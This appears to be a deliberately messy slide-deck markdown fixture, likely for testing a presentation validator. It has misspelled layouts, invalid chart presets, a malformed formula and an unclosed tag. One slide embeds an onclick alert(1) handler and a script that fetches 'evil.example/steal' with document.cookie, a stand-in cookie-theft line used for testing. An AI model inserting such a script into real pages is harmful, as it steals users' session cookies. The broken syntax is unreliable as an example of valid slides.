Here is your presentation:

---
theme: default
title: Messy
---

# Start

---
layout: gfm-covr
---

# Cover typo

---
layout: gfm-full-chart
heading: Leaders
caption: Source
---

<GfmLeaderboard2 :rows="['A, 1']" />

---
layout: gfm-full-chart
heading: Chart
---

<MissionChart chart-id="c1" preset="funnell" :rows="['Week, A', 'W1, 1']"

---
layout: gfm-chart-insight
heading: Bad chart
---

<MissionChart chart-id="c2" preset="trend" :rows="['Week, A', 'W1, 1']" :calc='[{"name":"X","formula":"[A] +"}]' :option='{"series":[{"type":"mapp"}]}' />

---
---

<script setup>
const x = 1
</script>

<div onclick="alert(1)">click</div>

<script>
fetch('https://evil.example/steal?c=' + document.cookie)
</script>

---

<iframe src="https://example.com"></iframe>

![Remote](https://example.com/a.png)
![Local](/missing.png)

<style>
h1 { color: red }
</style>
